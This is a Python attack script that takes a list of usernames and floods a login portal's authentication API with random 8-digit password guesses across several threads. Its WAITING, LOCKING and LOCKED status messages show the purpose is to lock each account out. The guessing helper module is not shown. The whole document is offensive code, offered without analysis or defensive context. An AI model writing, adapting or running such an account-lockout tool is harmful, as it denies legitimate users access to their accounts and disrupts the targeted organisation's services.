 #!/usr/bin/env python3

import requests
import rid_api
from threading import Thread
from itertools import islice
import time
import sys
import random

#Portal API URL
api_url = "[Login portal USL]/api/rest/authn"
#Username list file
name_file = open("account_list")
name_list = name_file.read().splitlines()
name_list_parsed = [x for x in name_list if not x.startswith('#')]
#Thread settings
thread_count = 5
words_per_thread = 5
#Time to wait between each account (In seconds)
delay_time = 0

for username in name_list_parsed:
    log_username = username.ljust(20)
    sys.stdout.write("{} : WAITING\r".format(log_username))
    time.sleep(delay_time)
    sys.stdout.write("{} : LOCKING\r".format(log_username))
    thread_list = []
    for i in range(0,thread_count):
        next_n_lines = [random.randint(10000000, 99999999) for i in range(words_per_thread)]
        temp_thread = Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines))
        temp_thread.start()
        thread_list.append(temp_thread)
    for thread in thread_list:
        thread.join()
    sys.stdout.write("{} : LOCKED \r\n".format(log_username))
